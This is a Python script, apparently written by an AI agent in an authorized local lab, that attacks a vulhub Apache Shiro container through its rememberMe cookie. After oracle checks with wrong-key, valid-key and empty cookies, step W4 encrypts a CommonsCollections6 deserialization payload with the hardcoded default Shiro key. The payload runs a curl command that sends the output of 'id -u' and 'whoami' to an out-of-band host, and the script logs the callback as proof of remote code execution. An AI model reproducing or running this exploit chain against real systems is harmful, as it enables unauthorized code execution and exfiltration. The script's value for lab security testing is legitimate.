#!/usr/bin/env python3
# loop3 t7 C1 补充：验证队长的"BadPaddingException"新 oracle 定义 + 确认原 bruteforce 证据未被改动
# 对照组：
#   W1 错误密钥密文   -> 期望日志出现 BadPaddingException（解密失败）
#   W2 正确密钥+合法流 -> 期望【无】BadPaddingException（且我已有 OOB 证据）
#   W3 无 cookie      -> 期望既不解析也不报错
import json, os, re, subprocess, sys, time, datetime, hashlib
import requests

CWD = r"C:\Users\Administrator\Documents\deepseek-harness\default-workspace"
EV = os.path.join(CWD, r"security\learning\_evidence")
SHIRO = "http://127.0.0.1:18081/"
OOB_HOST, OOB_PORT = "192.168.65.254", 8099
OOB_LOG = os.path.join(EV, "loop3-t7-c1-oob.jsonl")
UA = "loop3-t7/1.0 (authorized local lab)"
KEY = "kPH+bIxk5D2deZiIxcaaaA=="
OUT_PATH = os.path.join(EV, "loop3-t7-c1-badpadding-oracle-20261012.json")
OUT = {"ts": datetime.datetime.now().isoformat(), "purpose": "验证队长提出的 BadPaddingException oracle 定义", "steps": []}


def rec(n, **kw):
    OUT["steps"].append({"step": n, **kw})
    print(f"--- {n}: " + json.dumps(kw, ensure_ascii=False)[:800], flush=True)
    return kw


def kali(cmd):
    r = subprocess.run([sys.executable, r"dsh-tools\kali-run.py", cmd], capture_output=True, text=True, cwd=CWD)
    return r.stdout + r.stderr


def clean_b64(s):
    m = re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", s)
    return max(m, key=len) if m else ""


def log_len():
    r = subprocess.run("docker logs vulhub-shiro-18081", shell=True, capture_output=True, text=True)
    return len(((r.stdout or "") + (r.stderr or "")).splitlines())


def log_new(baseline):
    r = subprocess.run("docker logs vulhub-shiro-18081", shell=True, capture_output=True, text=True)
    lines = ((r.stdout or "") + (r.stderr or "")).splitlines()
    return lines[baseline:]


def send(ck):
    h = {"User-Agent": UA}
    if ck:
        h["Cookie"] = "rememberMe=" + ck
    time.sleep(1.2)
    r = requests.get(SHIRO, headers=h, timeout=40, allow_redirects=False)
    return {"status": r.status_code,
            "deleteMe": ("rememberMe=deleteMe" in r.headers.get("Set-Cookie", ""))}


print("=" * 78)

# ---- 原始 bruteforce 证据完整性（我不改它）----
bf = os.path.join(EV, "t7-c1-bruteforce-out.txt")
rec("bruteforce_file_untouched",
    path=bf,
    sha256=hashlib.sha256(open(bf, "rb").read()).hexdigest(),
    size=os.path.getsize(bf),
    note="按队长指令保留原始记录，未删改；其 EXECUTED_KEYS=[] 结论已在本报告 N-C02 标注为『oracle 失效导致的无效结论』")

# ---- W1 错误密钥 ----
kali("ruby /tmp/t7-c1-matrix.rb >/dev/null 2>&1")
time.sleep(1)
ck_wrong = clean_b64(kali("cat /tmp/t7-c1-matrix/P5_wrongkey_garbage.txt"))
b0 = log_len()
r1 = send(ck_wrong)
time.sleep(2.5)
new1 = log_new(b0)
bad1 = [l.strip() for l in new1 if "BadPadding" in l or "AEADBadTag" in l]
exc1 = [l.strip() for l in new1 if "Exception" in l]
rec("W1_wrongkey", response=r1, new_log_lines=len(new1),
    BadPadding_found=len(bad1), BadPadding_sample=bad1[:2],
    any_exception_count=len(exc1), exception_sample=exc1[:3])

# ---- W2 正确密钥 + 合法 Java 序列化流 ----
ck_valid = clean_b64(kali("cat /tmp/t7-c1-matrix/P1_valid_serialized_string.txt"))
b1 = log_len()
r2 = send(ck_valid)
time.sleep(2.5)
new2 = log_new(b1)
bad2 = [l.strip() for l in new2 if "BadPadding" in l or "AEADBadTag" in l]
exc2 = [l.strip() for l in new2 if "Exception" in l]
rec("W2_validkey_validstream", response=r2, new_log_lines=len(new2),
    BadPadding_found=len(bad2), any_exception_count=len(exc2), exception_sample=exc2[:3])

# ---- W3 无 cookie ----
b2 = log_len()
r3 = send("")
time.sleep(2.0)
new3 = log_new(b2)
rec("W3_no_cookie", response=r3, new_log_lines=len(new3),
    BadPadding_found=len([l for l in new3 if "BadPadding" in l]),
    any_exception_count=len([l for l in new3 if "Exception" in l]))

# ---- W4 正确密钥 + CC6 真实执行（带 OOB，只读命令）----
tag = "t7badpad-cc6"
cmd = f"curl -s http://{OOB_HOST}:{OOB_PORT}/{tag}-$(id -u)-$(whoami)"
kali(f"ruby /tmp/t7-c1-shiro-gen.rb CommonsCollections6 '{cmd}' /tmp/t7-badpad-cc6.txt '{KEY}' >/dev/null 2>&1")
ck_cc6 = clean_b64(kali("cat /tmp/t7-badpad-cc6.txt"))
b3 = log_len()
r4 = send(ck_cc6)
time.sleep(3.0)
new4 = log_new(b3)
bad4 = [l.strip() for l in new4 if "BadPadding" in l]
hits = []
if os.path.exists(OOB_LOG):
    for line in open(OOB_LOG, encoding="utf-8", errors="replace"):
        try:
            e = json.loads(line)
            if tag in (e.get("path") or ""):
                hits.append(e)
        except Exception:
            pass
rec("W4_validkey_CC6_RCE", response=r4, BadPadding_found=len(bad4),
    oob_hits=len(hits), oob_paths=[h["path"] for h in hits][:2],
    oob_client=[h.get("client") for h in hits][:2])

rec("verdict",
    leader_oracle_holds=(len(bad1) > 0 and len(bad2) == 0),
    interpretation="队长新 oracle 定义验证结果见 leader_oracle_holds；"
                   "同时 W4 的 OOB 命中表明 C1 早已用外带打通（HTTP 外带含真实命令输出）")

with open(OUT_PATH, "w", encoding="utf-8") as f:
    json.dump(OUT, f, ensure_ascii=False, indent=1)
print(json.dumps({"rc": "ok", "leader_oracle_holds": OUT["steps"][-1]["leader_oracle_holds"]}))
